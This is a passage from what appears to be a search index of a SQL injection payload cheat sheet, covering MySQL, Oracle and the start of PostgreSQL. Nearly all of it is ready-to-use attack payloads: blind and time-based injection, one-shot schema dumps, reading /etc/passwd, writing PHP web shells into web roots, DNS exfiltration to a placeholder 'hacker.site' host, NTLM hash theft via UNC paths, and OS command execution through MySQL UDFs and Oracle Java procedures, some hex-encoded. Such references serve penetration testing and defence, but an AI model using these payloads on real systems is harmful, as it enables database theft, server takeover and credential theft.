Blind"},{"location":"SQL%20Injection/MySQL%20Injection/#mysql-blind-with-substring-equivalent","text":"?id=1 and substring(version(),1,1)=5 ?id=1 and right(left(version(),1),1)=5 ?id=1 and left(version(),1)=4 ?id=1 and ascii(lower(substr(Version(),1,1)))=51 ?id=1 and (select mid(version(),1,1)=4) ?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables > 'A' ?id=1 AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns > 'A'","title":"MYSQL Blind with substring equivalent"},{"location":"SQL%20Injection/MySQL%20Injection/#mysql-blind-sql-injection-in-order-by-clause-using-a-binary-query-and-regexp","text":"This query basically orders by one column or the other, depending on whether the EXISTS() returns a 1 or not. For the EXISTS() function to return a 1, the REGEXP query needs to match up, this means you can bruteforce blind values character by character and leak data from the database without direct output. [...] ORDER BY (SELECT (CASE WHEN EXISTS(SELECT [COLUMN] FROM [TABLE] WHERE [COLUMN] REGEXP \"^[BRUTEFORCE CHAR BY CHAR].*\" AND [FURTHER OPTIONS / CONDITIONS]) THEN [ONE COLUMN TO ORDER BY] ELSE [ANOTHER COLUMN TO ORDER BY] END)); -- -","title":"MySQL Blind SQL Injection in ORDER BY clause using a binary query and REGEXP"},{"location":"SQL%20Injection/MySQL%20Injection/#mysql-blind-sql-injection-binary-query-using-regexp","text":"Payload: ' OR (SELECT (CASE WHEN EXISTS(SELECT name FROM items WHERE name REGEXP \"^a.*\") THEN SLEEP(3) ELSE 1 END)); -- - Would work in the query (where the \"where\" clause is the injection point): SELECT name,price FROM items WHERE name = '' OR (SELECT (CASE WHEN EXISTS(SELECT name FROM items WHERE name REGEXP \"^a.*\") THEN SLEEP(3) ELSE 1 END)); -- -'; In said query, it will check to see if an item exists in the \"name\" column in the \"items\" database that starts with an \"a\". If it will sleep for 3 seconds per item.","title":"MySQL Blind SQL Injection binary query using REGEXP."},{"location":"SQL%20Injection/MySQL%20Injection/#mysql-blind-using-a-conditional-statement","text":"TRUE: if @@version starts with a 5 : 2100935' OR IF(MID(@@version,1,1)='5',sleep(1),1)='2 Response: HTTP/1.1 500 Internal Server Error False: if @@version starts with a 4 : 2100935' OR IF(MID(@@version,1,1)='4',sleep(1),1)='2 Response: HTTP/1.1 200 OK","title":"MYSQL Blind using a conditional statement"},{"location":"SQL%20Injection/MySQL%20Injection/#mysql-blind-with-make_set","text":"AND MAKE_SET(YOLO<(SELECT(length(version()))),1) AND MAKE_SET(YOLO<ascii(substring(version(),POS,1)),1) AND MAKE_SET(YOLO<(SELECT(length(concat(login,password)))),1) AND MAKE_SET(YOLO<ascii(substring(concat(login,password),POS,1)),1)","title":"MYSQL Blind with MAKE_SET"},{"location":"SQL%20Injection/MySQL%20Injection/#mysql-blind-with-like","text":"'_' acts like the regex character '.', use it to speed up your blind testing SELECT cust_code FROM customer WHERE cust_name LIKE 'k__l';","title":"MYSQL Blind with LIKE"},{"location":"SQL%20Injection/MySQL%20Injection/#mysql-time-based","text":"The following SQL codes will delay the output from MySQL. +BENCHMARK(40000000,SHA1(1337))+ '%2Bbenchmark(3200,SHA1(1))%2B' AND [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]')) //SHA1 RLIKE SLEEP([SLEEPTIME]) OR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))","title":"MYSQL Time Based"},{"location":"SQL%20Injection/MySQL%20Injection/#using-sleep-in-a-subselect","text":"1 and (select sleep(10) from dual where database() like '%')# 1 and (select sleep(10) from dual where database() like '___')# 1 and (select sleep(10) from dual where database() like '____')# 1 and (select sleep(10) from dual where database() like '_____')# 1 and (select sleep(10) from dual where database() like 'a____')# ... 1 and (select sleep(10) from dual where database() like 's____')# 1 and (select sleep(10) from dual where database() like 'sa___')# ... 1 and (select sleep(10) from dual where database() like 'sw___')# 1 and (select sleep(10) from dual where database() like 'swa__')# 1 and (select sleep(10) from dual where database() like 'swb__')# 1 and (select sleep(10) from dual where database() like 'swi__')# ... 1 and (select sleep(10) from dual where (select table_name from information_schema.columns where table_schema=database() and column_name like '%pass%' limit 0,1) like '%')#","title":"Using SLEEP in a subselect"},{"location":"SQL%20Injection/MySQL%20Injection/#using-conditional-statements","text":"?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()),1,1)))>=100,1, BENCHMARK(2000000,MD5(NOW()))) -- ?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()), 1, 1)))>=100, 1, SLEEP(3)) -- ?id=1 OR IF(MID(@@version,1,1)='5',sleep(1),1)='2","title":"Using conditional statements"},{"location":"SQL%20Injection/MySQL%20Injection/#mysql-dios-dump-in-one-shot","text":"(select (@) from (select(@:=0x00),(select (@) from (information_schema.columns) where (table_schema>=@) and (@)in (@:=concat(@,0x0D,0x0A,' [ ',table_schema,' ] > ',table_name,' > ',column_name,0x7C))))a)# (select (@) from (select(@:=0x00),(select (@) from (db_data.table_data) where (@)in (@:=concat(@,0x0D,0x0A,0x7C,' [ ',column_data1,' ] > ',column_data2,' > ',0x7C))))a)# -- SecurityIdiots make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@) -- Profexer (select(@)from(select(@:=0x00),(select(@)from(information_schema.columns)where(@)in(@:=concat(@,0x3C62723E,table_name,0x3a,column_name))))a) -- Dr.Z3r0 (select(select concat(@:=0xa7,(select count(*)from(information_schema.columns)where(@:=concat(@,0x3c6c693e,table_name,0x3a,column_name))),@)) -- M@dBl00d (Select export_set(5,@:=0,(select count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2)) -- Zen +make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@) -- Zen WAF (/*!12345sELecT*/(@)from(/*!12345sELecT*/(@:=0x00),(/*!12345sELecT*/(@)from(`InFoRMAtiON_sCHeMa`.`ColUMNs`)where(`TAblE_sCHemA`=DatAbAsE/*data*/())and(@)in(@:=CoNCat%0a(@,0x3c62723e5461626c6520466f756e64203a20,TaBLe_nAMe,0x3a3a,column_name))))a) -- ~tr0jAn WAF +concat/*!(unhex(hex(concat/*!(0x3c2f6469763e3c2f696d673e3c2f613e3c2f703e3c2f7469746c653e,0x223e,0x273e,0x3c62723e3c62723e,unhex(hex(concat/*!(0x3c63656e7465723e3c666f6e7420636f6c6f723d7265642073697a653d343e3c623e3a3a207e7472306a416e2a2044756d7020496e204f6e652053686f74205175657279203c666f6e7420636f6c6f723d626c75653e28574146204279706173736564203a2d20207620312e30293c2f666f6e743e203c2f666f6e743e3c2f63656e7465723e3c2f623e))),0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d626c75653e4d7953514c2056657273696f6e203a3a20,version(),0x7e20,@@version_comment,0x3c62723e5072696d617279204461746162617365203a3a20,@d:=database(),0x3c62723e44617461626173652055736572203a3a20,user(),(/*!12345selEcT*/(@x)/*!from*/(/*!12345selEcT*/(@x:=0x00),(@r:=0),(@running_number:=0),(@tbl:=0x00),(/*!12345selEcT*/(0) from(information_schema./**/columns)where(table_schema=database()) and(0x00)in(@x:=Concat/*!(@x, 0x3c62723e, if( (@tbl!=table_name), Concat/*!(0x3c666f6e7420636f6c6f723d707572706c652073697a653d333e,0x3c62723e,0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@r:=@r%2b1, 2, 0x30),0x2e203c2f666f6e743e,@tbl:=table_name,0x203c666f6e7420636f6c6f723d677265656e3e3a3a204461746162617365203a3a203c666f6e7420636f6c6f723d626c61636b3e28,database(),0x293c2f666f6e743e3c2f666f6e743e,0x3c2f666f6e743e,0x3c62723e), 0x00),0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@running_number:=@running_number%2b1,3,0x30),0x2e20,0x3c2f666f6e743e,0x3c666f6e7420636f6c6f723d7265643e,column_name,0x3c2f666f6e743e))))x)))))*/+ -- ~tr0jAn Benchmark +concat(0x3c666f6e7420636f6c6f723d7265643e3c62723e3c62723e7e7472306a416e2a203a3a3c666f6e7420636f6c6f723d626c75653e20,version(),0x3c62723e546f74616c204e756d626572204f6620446174616261736573203a3a20,(select count(*) from information_schema.schemata),0x3c2f666f6e743e3c2f666f6e743e,0x202d2d203a2d20,concat(@sc:=0x00,@scc:=0x00,@r:=0,benchmark(@a:=(select count(*) from information_schema.schemata),@scc:=concat(@scc,0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d7265643e,LPAD(@r:=@r%2b1,3,0x30),0x2e20,(Select concat(0x3c623e,@sc:=schema_name,0x3c2f623e) from information_schema.schemata where schema_name>@sc order by schema_name limit 1),0x202028204e756d626572204f66205461626c657320496e204461746162617365203a3a20,(select count(*) from information_Schema.tables where table_schema=@sc),0x29,0x3c2f666f6e743e,0x202e2e2e20 ,@t:=0x00,@tt:=0x00,@tr:=0,benchmark((select count(*) from information_Schema.tables where table_schema=@sc),@tt:=concat(@tt,0x3c62723e,0x3c666f6e7420636f6c6f723d677265656e3e,LPAD(@tr:=@tr%2b1,3,0x30),0x2e20,(select concat(0x3c623e,@t:=table_name,0x3c2f623e) from information_Schema.tables where table_schema=@sc and table_name>@t order by table_name limit 1),0x203a20284e756d626572204f6620436f6c756d6e7320496e207461626c65203a3a20,(select count(*) from information_Schema.columns where table_name=@t),0x29,0x3c2f666f6e743e,0x202d2d3a20,@c:=0x00,@cc:=0x00,@cr:=0,benchmark((Select count(*) from information_schema.columns where table_schema=@sc and table_name=@t),@cc:=concat(@cc,0x3c62723e,0x3c666f6e7420636f6c6f723d707572706c653e,LPAD(@cr:=@cr%2b1,3,0x30),0x2e20,(Select (@c:=column_name) from information_schema.columns where table_schema=@sc and table_name=@t and column_name>@c order by column_name LIMIT 1),0x3c2f666f6e743e)),@cc,0x3c62723e)),@tt)),@scc),0x3c62723e3c62723e,0x3c62723e3c62723e)+ -- N1Z4M WAF +/*!13337concat*/(0x3c616464726573733e3c63656e7465723e3c62723e3c68313e3c666f6e7420636f6c6f723d22526564223e496e6a6563746564206279204e315a344d3c2f666f6e743e3c68313e3c2f63656e7465723e3c62723e3c666f6e7420636f6c6f723d2223663364393361223e4461746162617365207e3e3e203c2f666f6e743e,database/**N1Z4M**/(),0x3c62723e3c666f6e7420636f6c6f723d2223306639643936223e56657273696f6e207e3e3e203c2f666f6e743e,@@version,0x3c62723e3c666f6e7420636f6c6f723d2223306637363964223e55736572207e3e3e203c2f666f6e743e,user/**N1Z4M**/(),0x3c62723e3c666f6e7420636f6c6f723d2223306639643365223e506f7274207e3e3e203c2f666f6e743e,@@port,0x3c62723e3c666f6e7420636f6c6f723d2223346435613733223e4f53207e3e3e203c2f666f6e743e,@@version_compile_os,0x2c3c62723e3c666f6e7420636f6c6f723d2223366134343732223e44617461204469726563746f7279204c6f636174696f6e207e3e3e203c2f666f6e743e,@@datadir,0x3c62723e3c666f6e7420636f6c6f723d2223333130343362223e55554944207e3e3e203c2f666f6e743e,UUID/**N1Z4M**/(),0x3c62723e3c666f6e7420636f6c6f723d2223363930343637223e43757272656e742055736572207e3e3e203c2f666f6e743e,current_user/**N1Z4M**/(),0x3c62723e3c666f6e7420636f6c6f723d2223383432303831223e54656d70204469726563746f7279207e3e3e203c2f666f6e743e,@@tmpdir,0x3c62723e3c666f6e7420636f6c6f723d2223396336623934223e424954532044455441494c53207e3e3e203c2f666f6e743e,@@version_compile_machine,0x3c62723e3c666f6e7420636f6c6f723d2223396630613838223e46494c452053595354454d207e3e3e203c2f666f6e743e,@@CHARACTER_SET_FILESYSTEM,0x3c62723e3c666f6e7420636f6c6f723d2223393234323564223e486f7374204e616d65207e3e3e203c2f666f6e743e,@@hostname,0x3c62723e3c666f6e7420636f6c6f723d2223393430313333223e53797374656d2055554944204b6579207e3e3e203c2f666f6e743e,UUID/**N1Z4M**/(),0x3c62723e3c666f6e7420636f6c6f723d2223613332363531223e53796d4c696e6b20207e3e3e203c2f666f6e743e,@@GLOBAL.have_symlink,0x3c62723e3c666f6e7420636f6c6f723d2223353830633139223e53534c207e3e3e203c2f666f6e743e,@@GLOBAL.have_ssl,0x3c62723e3c666f6e7420636f6c6f723d2223393931663333223e42617365204469726563746f7279207e3e3e203c2f666f6e743e,@@basedir,0x3c62723e3c2f616464726573733e3c62723e3c666f6e7420636f6c6f723d22626c7565223e,(/*!13337select*/(@a)/*!13337from*/(/*!13337select*/(@a:=0x00),(/*!13337select*/(@a)/*!13337from*/(information_schema.columns)/*!13337where*/(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(@a)in(@a:=/*!13337concat*/(@a,table_schema,0x3c666f6e7420636f6c6f723d22726564223e20203a3a203c2f666f6e743e,table_name,0x3c666f6e7420636f6c6f723d22726564223e20203a3a203c2f666f6e743e,column_name,0x3c62723e))))a))+ -- sharik (select(@a)from(select(@a:=0x00),(select(@a)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(@a)in(@a:=concat(@a,table_name,0x203a3a20,column_name,0x3c62723e))))a)","title":"MYSQL DIOS - Dump in One Shot"},{"location":"SQL%20Injection/MySQL%20Injection/#mysql-current-queries","text":"This table can list all operations that DB is performing at the moment. union SELECT 1,state,info,4 FROM INFORMATION_SCHEMA.PROCESSLIST # -- Dump in one shot example for the table content. union select 1,(select(@)from(select(@:=0x00),(select(@)from(information_schema.processlist)where(@)in(@:=concat(@,0x3C62723E,state,0x3a,info))))a),3,4 #","title":"MYSQL Current queries"},{"location":"SQL%20Injection/MySQL%20Injection/#mysql-read-content-of-a-file","text":"Need the filepriv , otherwise you will get the error : ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement ' UNION ALL SELECT LOAD_FILE('/etc/passwd') -- UNION ALL SELECT TO_base64(LOAD_FILE('/var/www/html/index.php')); If you are root on the database, you can re-enable the LOAD_FILE using the following query GRANT FILE ON *.* TO 'root'@'localhost'; FLUSH PRIVILEGES;#","title":"MYSQL Read content of a file"},{"location":"SQL%20Injection/MySQL%20Injection/#mysql-write-a-shell","text":"","title":"MYSQL Write a shell"},{"location":"SQL%20Injection/MySQL%20Injection/#into-outfile-method","text":"[...] UNION SELECT \"<?php system($_GET['cmd']); ?>\" into outfile \"C:\\\\xampp\\\\htdocs\\\\backdoor.php\" [...] UNION SELECT '' INTO OUTFILE '/var/www/html/x.php' FIELDS TERMINATED BY '<?php phpinfo();?>' [...] UNION SELECT 1,2,3,4,5,0x3c3f70687020706870696e666f28293b203f3e into outfile 'C:\\\\wamp\\\\www\\\\pwnd.php'-- - [...] union all select 1,2,3,4,\"<?php echo shell_exec($_GET['cmd']);?>\",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'","title":"Into outfile method"},{"location":"SQL%20Injection/MySQL%20Injection/#into-dumpfile-method","text":"[...] UNION SELECT 0xPHP_PAYLOAD_IN_HEX, NULL, NULL INTO DUMPFILE 'C:/Program Files/EasyPHP-12.1/www/shell.php' [...] UNION SELECT 0x3c3f7068702073797374656d28245f4745545b2763275d293b203f3e INTO DUMPFILE '/var/www/html/images/shell.php';","title":"Into dumpfile method"},{"location":"SQL%20Injection/MySQL%20Injection/#mysql-truncation","text":"In MYSQL \" admin \" and \" admin \" are the same. If the username column in the database has a character-limit the rest of the characters are truncated. So if the database has a column-limit of 20 characters and we input a string with 21 characters the last 1 character will be removed. `username` varchar(20) not null Payload: username = \"admin a\"","title":"MYSQL Truncation"},{"location":"SQL%20Injection/MySQL%20Injection/#mysql-fast-exploitation","text":"Requirement: MySQL >= 5.7.22 Use json_arrayagg() instead of group_concat() which allows less symbols to be displayed * group_concat() = 1024 symbols * json_arrayagg() > 16,000,000 symbols SELECT json_arrayagg(concat_ws(0x3a,table_schema,table_name)) from INFORMATION_SCHEMA.TABLES;","title":"MYSQL Fast Exploitation"},{"location":"SQL%20Injection/MySQL%20Injection/#mysql-udf-command-execution","text":"First you need to check if the UDF are installed on the server. $ whereis lib_mysqludf_sys.so /usr/lib/lib_mysqludf_sys.so Then you can use functions such as sys_exec and sys_eval . $ mysql -u root -p mysql Enter password: [...] mysql> SELECT sys_eval('id'); +--------------------------------------------------+ | sys_eval('id') | +--------------------------------------------------+ | uid=118(mysql) gid=128(mysql) groups=128(mysql) | +--------------------------------------------------+","title":"MYSQL UDF command execution"},{"location":"SQL%20Injection/MySQL%20Injection/#mysql-out-of-band","text":"select @@version into outfile '\\\\\\\\192.168.0.100\\\\temp\\\\out.txt'; select @@version into dumpfile '\\\\\\\\192.168.0.100\\\\temp\\\\out.txt","title":"MYSQL Out of band"},{"location":"SQL%20Injection/MySQL%20Injection/#dns-exfiltration","text":"select load_file(concat('\\\\\\\\',version(),'.hacker.site\\\\a.txt')); select load_file(concat(0x5c5c5c5c,version(),0x2e6861636b65722e736974655c5c612e747874))","title":"DNS exfiltration"},{"location":"SQL%20Injection/MySQL%20Injection/#unc-path-ntlm-hash-stealing","text":"select load_file('\\\\\\\\error\\\\abc'); select load_file(0x5c5c5c5c6572726f725c5c616263); select 'osanda' into dumpfile '\\\\\\\\error\\\\abc'; select 'osanda' into outfile '\\\\\\\\error\\\\abc'; load data infile '\\\\\\\\error\\\\abc' into table database.table_name;","title":"UNC Path - NTLM hash stealing"},{"location":"SQL%20Injection/MySQL%20Injection/#references","text":"MySQL Out of Band Hacking - @OsandaMalith [Sqli] Extracting data without knowing columns names - Ahmed Sultan @0x4148 Help \u043f\u043e MySql \u0438\u043d\u044a\u0435\u043a\u0446\u0438\u044f\u043c - rdot.org SQL Truncation Attack - Warlock HackerOne @ajxchapman 50m-ctf writeup - Alex Chapman @ajxchapman SQL Wiki - netspi ekoparty web_100 - 2016/10/26 - p4-team Websec - MySQL - Roberto Salgado - May 29, 2013.","title":"References"},{"location":"SQL%20Injection/OracleSQL%20Injection/","text":"Oracle SQL Injection Summary Oracle SQL version Oracle SQL database name Oracle SQL List databases Oracle SQL List columns Oracle SQL List tables Oracle SQL Error Based Oracle SQL Blind Oracle SQL Time Based Oracle SQL Command execution References Oracle SQL version SELECT user FROM dual UNION SELECT * FROM v$version Oracle SQL database name SELECT global_name FROM global_name; SELECT name FROM V$DATABASE; SELECT instance_name FROM V$INSTANCE; SELECT SYS.DATABASE_NAME FROM DUAL; Oracle SQL List Databases SELECT DISTINCT owner FROM all_tables; Oracle SQL List Columns SELECT column_name FROM all_tab_columns WHERE table_name = 'blah'; SELECT column_name FROM all_tab_columns WHERE table_name = 'blah' and owner = 'foo'; Oracle SQL List Tables SELECT table_name FROM all_tables; SELECT owner, table_name FROM all_tables; SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE '%PASS%'; Oracle SQL Error based Description Query Invalid HTTP Request SELECT utl_inaddr.get_host_name((select banner from v$version where rownum=1)) FROM dual CTXSYS.DRITHSX.SN SELECT CTXSYS.DRITHSX.SN(user,(select banner from v$version where rownum=1)) FROM dual Invalid XPath SELECT ordsys.ord_dicom.getmappingxpath((select banner from v$version where rownum=1),user,user) FROM dual Invalid XML SELECT to_char(dbms_xmlgen.getxml('select \"'||(select user from sys.dual)||'\" FROM sys.dual')) FROM dual Invalid XML SELECT rtrim(extract(xmlagg(xmlelement(\"s\", username || ',')),'/s').getstringval(),',') FROM all_users SQL Error SELECT NVL(CAST(LENGTH(USERNAME) AS VARCHAR(4000)),CHR(32)) FROM (SELECT USERNAME,ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1)) Oracle SQL Blind Description Query Version is 12.2 SELECT COUNT(*) FROM v$version WHERE banner LIKE 'Oracle%12.2%'; Subselect is enabled SELECT 1 FROM dual WHERE 1=(SELECT 1 FROM dual) Table log_table exists SELECT 1 FROM dual WHERE 1=(SELECT 1 from log_table); Column message exists in table log_table SELECT COUNT(*) FROM user_tab_cols WHERE column_name = 'MESSAGE' AND table_name = 'LOG_TABLE'; First letter of first message is t SELECT message FROM log_table WHERE rownum=1 AND message LIKE 't%'; Oracle SQL Time based AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) comment: -- /**/ Oracle SQL Command execution ODAT (Oracle Database Attacking Tool) /* create Java class */ BEGIN EXECUTE IMMEDIATE 'create or replace and compile java source named \"PwnUtil\" as import java.io.*; public class PwnUtil{ public static String runCmd(String args){ try{ BufferedReader myReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(args).getInputStream()));String stemp, str = \"\";while ((stemp = myReader.readLine()) != null) str += stemp + \"\\n\";myReader.close();return str;} catch (Exception e){ return e.toString();}} public static String readFile(String filename){ try{ BufferedReader myReader = new BufferedReader(new FileReader(filename));String stemp, str = \"\";while((stemp = myReader.readLine()) != null) str += stemp + \"\\n\";myReader.close();return str;} catch (Exception e){ return e.toString();}}};'; END; / BEGIN EXECUTE IMMEDIATE 'create or replace function PwnUtilFunc(p_cmd in varchar2) return varchar2 as language java name ''PwnUtil.runCmd(java.lang.String) return String'';'; END; / /* run OS command */ SELECT PwnUtilFunc('ping -c 4 localhost') FROM dual; or (hex encoded) /* create Java class */ SELECT TO_CHAR(dbms_xmlquery.getxml('declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate utl_raw.cast_to_varchar2(hextoraw(''637265617465206f72207265706c61636520616e6420636f6d70696c65206a61766120736f75726365206e616d6564202270776e7574696c2220617320696d706f7274206a6176612e696f2e2a3b7075626c696320636c6173732070776e7574696c7b7075626c69632073746174696320537472696e672072756e28537472696e672061726773297b7472797b4275666665726564526561646572206d726561643d6e6577204275666665726564526561646572286e657720496e70757453747265616d5265616465722852756e74696d652e67657452756e74696d6528292e657865632861726773292e676574496e70757453747265616d282929293b20537472696e67207374656d702c207374723d22223b207768696c6528287374656d703d6d726561642e726561644c696e6528292920213d6e756c6c29207374722b3d7374656d702b225c6e223b206d726561642e636c6f736528293b2072657475726e207374723b7d636174636828457863657074696f6e2065297b72657475726e20652e746f537472696e6728293b7d7d7d'')); EXECUTE IMMEDIATE utl_raw.cast_to_varchar2(hextoraw(''637265617465206f72207265706c6163652066756e6374696f6e2050776e5574696c46756e6328705f636d6420696e207661726368617232292072657475726e207661726368617232206173206c616e6775616765206a617661206e616d65202770776e7574696c2e72756e286a6176612e6c616e672e537472696e67292072657475726e20537472696e67273b'')); end;')) results FROM dual /* run OS command */ SELECT PwnUtilFunc('ping -c 4 localhost') FROM dual; References NetSpi - SQL Wiki ASDC12 - New and Improved Hacking Oracle From Web","title":"Oracle SQL Injection"},{"location":"SQL%20Injection/OracleSQL%20Injection/#oracle-sql-injection","text":"","title":"Oracle SQL Injection"},{"location":"SQL%20Injection/OracleSQL%20Injection/#summary","text":"Oracle SQL version Oracle SQL database name Oracle SQL List databases Oracle SQL List columns Oracle SQL List tables Oracle SQL Error Based Oracle SQL Blind Oracle SQL Time Based Oracle SQL Command execution References","title":"Summary"},{"location":"SQL%20Injection/OracleSQL%20Injection/#oracle-sql-version","text":"SELECT user FROM dual UNION SELECT * FROM v$version","title":"Oracle SQL version"},{"location":"SQL%20Injection/OracleSQL%20Injection/#oracle-sql-database-name","text":"SELECT global_name FROM global_name; SELECT name FROM V$DATABASE; SELECT instance_name FROM V$INSTANCE; SELECT SYS.DATABASE_NAME FROM DUAL;","title":"Oracle SQL database name"},{"location":"SQL%20Injection/OracleSQL%20Injection/#oracle-sql-list-databases","text":"SELECT DISTINCT owner FROM all_tables;","title":"Oracle SQL List Databases"},{"location":"SQL%20Injection/OracleSQL%20Injection/#oracle-sql-list-columns","text":"SELECT column_name FROM all_tab_columns WHERE table_name = 'blah'; SELECT column_name FROM all_tab_columns WHERE table_name = 'blah' and owner = 'foo';","title":"Oracle SQL List Columns"},{"location":"SQL%20Injection/OracleSQL%20Injection/#oracle-sql-list-tables","text":"SELECT table_name FROM all_tables; SELECT owner, table_name FROM all_tables; SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE '%PASS%';","title":"Oracle SQL List Tables"},{"location":"SQL%20Injection/OracleSQL%20Injection/#oracle-sql-error-based","text":"Description Query Invalid HTTP Request SELECT utl_inaddr.get_host_name((select banner from v$version where rownum=1)) FROM dual CTXSYS.DRITHSX.SN SELECT CTXSYS.DRITHSX.SN(user,(select banner from v$version where rownum=1)) FROM dual Invalid XPath SELECT ordsys.ord_dicom.getmappingxpath((select banner from v$version where rownum=1),user,user) FROM dual Invalid XML SELECT to_char(dbms_xmlgen.getxml('select \"'||(select user from sys.dual)||'\" FROM sys.dual')) FROM dual Invalid XML SELECT rtrim(extract(xmlagg(xmlelement(\"s\", username || ',')),'/s').getstringval(),',') FROM all_users SQL Error SELECT NVL(CAST(LENGTH(USERNAME) AS VARCHAR(4000)),CHR(32)) FROM (SELECT USERNAME,ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1))","title":"Oracle SQL Error based"},{"location":"SQL%20Injection/OracleSQL%20Injection/#oracle-sql-blind","text":"Description Query Version is 12.2 SELECT COUNT(*) FROM v$version WHERE banner LIKE 'Oracle%12.2%'; Subselect is enabled SELECT 1 FROM dual WHERE 1=(SELECT 1 FROM dual) Table log_table exists SELECT 1 FROM dual WHERE 1=(SELECT 1 from log_table); Column message exists in table log_table SELECT COUNT(*) FROM user_tab_cols WHERE column_name = 'MESSAGE' AND table_name = 'LOG_TABLE'; First letter of first message is t SELECT message FROM log_table WHERE rownum=1 AND message LIKE 't%';","title":"Oracle SQL Blind"},{"location":"SQL%20Injection/OracleSQL%20Injection/#oracle-sql-time-based","text":"AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) comment: -- /**/","title":"Oracle SQL Time based"},{"location":"SQL%20Injection/OracleSQL%20Injection/#oracle-sql-command-execution","text":"ODAT (Oracle Database Attacking Tool) /* create Java class */ BEGIN EXECUTE IMMEDIATE 'create or replace and compile java source named \"PwnUtil\" as import java.io.*; public class PwnUtil{ public static String runCmd(String args){ try{ BufferedReader myReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(args).getInputStream()));String stemp, str = \"\";while ((stemp = myReader.readLine()) != null) str += stemp + \"\\n\";myReader.close();return str;} catch (Exception e){ return e.toString();}} public static String readFile(String filename){ try{ BufferedReader myReader = new BufferedReader(new FileReader(filename));String stemp, str = \"\";while((stemp = myReader.readLine()) != null) str += stemp + \"\\n\";myReader.close();return str;} catch (Exception e){ return e.toString();}}};'; END; / BEGIN EXECUTE IMMEDIATE 'create or replace function PwnUtilFunc(p_cmd in varchar2) return varchar2 as language java name ''PwnUtil.runCmd(java.lang.String) return String'';'; END; / /* run OS command */ SELECT PwnUtilFunc('ping -c 4 localhost') FROM dual; or (hex encoded) /* create Java class */ SELECT TO_CHAR(dbms_xmlquery.getxml('declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate utl_raw.cast_to_varchar2(hextoraw(''637265617465206f72207265706c61636520616e6420636f6d70696c65206a61766120736f75726365206e616d6564202270776e7574696c2220617320696d706f7274206a6176612e696f2e2a3b7075626c696320636c6173732070776e7574696c7b7075626c69632073746174696320537472696e672072756e28537472696e672061726773297b7472797b4275666665726564526561646572206d726561643d6e6577204275666665726564526561646572286e657720496e70757453747265616d5265616465722852756e74696d652e67657452756e74696d6528292e657865632861726773292e676574496e70757453747265616d282929293b20537472696e67207374656d702c207374723d22223b207768696c6528287374656d703d6d726561642e726561644c696e6528292920213d6e756c6c29207374722b3d7374656d702b225c6e223b206d726561642e636c6f736528293b2072657475726e207374723b7d636174636828457863657074696f6e2065297b72657475726e20652e746f537472696e6728293b7d7d7d'')); EXECUTE IMMEDIATE utl_raw.cast_to_varchar2(hextoraw(''637265617465206f72207265706c6163652066756e6374696f6e2050776e5574696c46756e6328705f636d6420696e207661726368617232292072657475726e207661726368617232206173206c616e6775616765206a617661206e616d65202770776e7574696c2e72756e286a6176612e6c616e672e537472696e67292072657475726e20537472696e67273b'')); end;')) results FROM dual /* run OS command */ SELECT PwnUtilFunc('ping -c 4 localhost') FROM dual;","title":"Oracle SQL Command execution"},{"location":"SQL%20Injection/OracleSQL%20Injection/#references","text":"NetSpi - SQL Wiki ASDC12 - New and Improved Hacking Oracle From Web","title":"References"},{"location":"SQL%20Injection/PostgreSQL%20Injection/","text":"PostgreSQL injection Summary PostgreSQL Comments PostgreSQL version PostgreSQL Current User PostgreSQL List Users PostgreSQL List Password Hashes PostgreSQL List Database Administrator Accounts PostgreSQL List Privileges PostgreSQL Check if Current User is Superuser PostgreSQL database name PostgreSQL List databases PostgreSQL List tables PostgreSQL List columns PostgreSQL Error Based PostgreSQL XML Helpers PostgreSQL Blind PostgreSQL Time Based PostgreSQL Stacked query PostgreSQL File Read PostgreSQL File Write PostgreSQL Command execution CVE-2019\u20139193 Using libc.so.6 Bypass Filter References PostgreSQL Comments -- /**/ PostgreSQL Version SELECT version() PostgreSQL Current User SELECT user; SELECT current_user; SELECT session_user; SELECT usename FROM pg_user; SELECT getpgusername(); PostgreSQL List Users SELECT usename FROM pg_user PostgreSQL List Password Hashes SELECT usename, passwd FROM pg_shadow PostgreSQL List Database Administrator Accounts SELECT usename FROM pg_user WHERE usesuper IS TRUE PostgreSQL List Privileges SELECT usename, usecreatedb, usesuper, usecatupd FROM pg_user PostgreSQL Check if Current User is Superuser SHOW is_superuser; SELECT current_setting('is_superuser'); SELECT usesuper FROM pg_user WHERE usename = CURRENT_USER; PostgreSQL Database Name SELECT current_database() PostgreSQL List Database SELECT datname FROM pg_database PostgreSQL List Tables SELECT table_name FROM information_schema.tables PostgreSQL List Columns SELECT column_name FROM information_schema.columns WHERE table_name='data_table' PostgreSQL Error Based ,cAsT(chr(126)||vErSiOn()||chr(126)+aS+nUmeRiC) 